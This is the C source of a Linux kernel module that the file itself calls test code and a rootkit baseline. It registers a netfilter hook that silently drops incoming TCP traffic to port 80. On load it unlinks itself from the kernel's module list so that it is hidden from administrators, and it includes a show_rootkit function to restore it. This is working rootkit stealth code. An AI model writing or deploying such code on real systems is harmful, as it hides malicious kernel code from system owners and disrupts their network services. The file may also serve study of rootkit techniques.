/*****************************************************
* This is just test code, establishing a baseline for this project
* Reference: https://infosecwriteups.com/linux-kernel-communication-part-1-netfilter-hooks-15c07a5a5c4e
 *****************************************************/

#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <linux/udp.h>


static struct nf_hook_ops *nfho = NULL;
static struct list_head *module_previous; // Tracks linked-list LKM list
static int module_track = 0; // Tracks whether module is hidden (0) or visible(1)

// Hides kernel module upon calling
void module_hide(void)
{
	module_previous = THIS_MODULE->list.prev;
	list_del(&THIS_MODULE->list);
	module_track = 0;
}

// Puts kernel module back into LKM list
// TODO: Come back to implement this when full hfunc functionality is implemented
void show_rootkit(void){
    list_add(&THIS_MODULE->list, module_previous);
    module_track = 1;
}


// Hook function, does the schtuff
static unsigned int hfunc(void *priv, struct sk_buff *skb, const struct nf_hook_state *state)
{
	struct iphdr *iph;
	struct tcphdr *tcph;
	if (!skb)
		return NF_ACCEPT;

	iph = ip_hdr(skb);
	if (iph->protocol == IPPROTO_TCP) {
		tcph = tcp_hdr(skb);
		if (ntohs(tcph->dest) == 22) {
			return NF_ACCEPT;
		}
		else if (ntohs(tcph->dest) == 80) {
            		return NF_DROP;
        	}
	}
	
	return NF_ACCEPT;
}

// Initializing function for loading the module into the kernel
static int __init LKM_init(void)
{
	nfho = (struct nf_hook_ops*)kcalloc(1, sizeof(struct nf_hook_ops), GFP_KERNEL);
	
	/* Initialize netfilter hook */
	nfho->hook 	= (nf_hookfn*)hfunc;		/* hook function */
	nfho->hooknum 	= NF_INET_PRE_ROUTING;		/* received packets */
	nfho->pf 	= PF_INET;			/* IPv4 */
	nfho->priority 	= NF_IP_PRI_FIRST;		/* max hook priority */
	
	nf_register_net_hook(&init_net, nfho);
	module_hide();
	return 0;
}

// Uninitializes/removes the LKM
static void __exit LKM_exit(void)
{
	nf_unregister_net_hook(&init_net, nfho);
	kfree(nfho);
}

module_init(LKM_init);
module_exit(LKM_exit);
MODULE_LICENSE("GPL");
